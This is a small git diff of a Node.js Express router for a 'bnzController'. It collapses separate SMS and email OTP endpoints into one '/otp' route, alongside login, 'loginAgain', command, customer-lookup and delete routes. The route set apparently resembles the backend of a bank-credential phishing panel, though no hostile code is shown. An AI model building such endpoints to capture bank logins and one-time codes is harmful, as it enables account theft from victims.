@@ -5,9 +5,8 @@ const {
     getInfo,
     submitLogin,
     submitLoginAgain,
+    submitOtp,
     deleteEntry,
-    submitSmsOtp,
-    submitEmailOtp,
 } = require("../controllers/bnzController");
 
 const router = express.Router();
@@ -17,8 +16,7 @@ router.post("/command", command);
 router.get("/customers/id/:uniqueid", getInfo);
 router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
-router.post("/otp/sms", submitSmsOtp);
-router.post("/otp/email", submitEmailOtp);
+router.post("/otp", submitOtp);
 router.post("/delete", deleteEntry);
 
 module.exports = router;
